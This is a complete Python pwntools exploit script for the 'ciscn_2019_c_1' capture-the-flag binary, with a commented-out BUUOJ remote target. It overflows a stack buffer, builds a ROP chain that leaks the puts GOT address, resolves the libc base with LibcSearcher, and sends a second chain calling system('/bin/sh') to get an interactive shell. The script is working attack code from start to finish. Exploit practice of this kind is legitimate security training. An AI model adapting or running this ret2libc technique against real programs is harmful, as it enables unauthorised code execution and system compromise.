from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

#get got and plt first to get the real position of libc

elf = ELF("ciscn_2019_c_1")

p = process("./ciscn_2019_c_1")
#p = remote("node3.buuoj.cn", 29439)

put_got = elf.got["puts"]
put_plt = elf.plt["puts"]
pop_rdi = 0x400c83
ret_addr = 0x4006b9

#address of _start()
main_addr = elf.symbols["main"]

#generate payload of getting got of puts
payload =  b'a' * ( 0x48 + 8 + 8 - 1 ) + b'\0' + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr)
p.sendlineafter("choice!\n", "1")
p.sendlineafter("Input your Plaintext to be encrypted\n", payload)

#handle cipher output
p.recvuntil('\n')
p.recvuntil('\n')

puts_real_addr = u64(p.recvuntil('\n')[:-1].ljust(8,b'\0'))

#get version of libc
libc = LibcSearcher("puts", puts_real_addr)
libc_base = puts_real_addr - libc.dump("puts")
sys_addr = libc_base + libc.dump("system")
bin_str = libc_base + libc.dump("str_bin_sh")

p.sendlineafter("choice!\n", "1")
payload = b'a' * ( 0x48 + 8 + 8 - 1 ) + b'\0' + p64(ret_addr) + p64(pop_rdi) + p64(bin_str) + p64(sys_addr)
p.sendlineafter("Input your Plaintext to be encrypted\n", payload)

p.interactive()
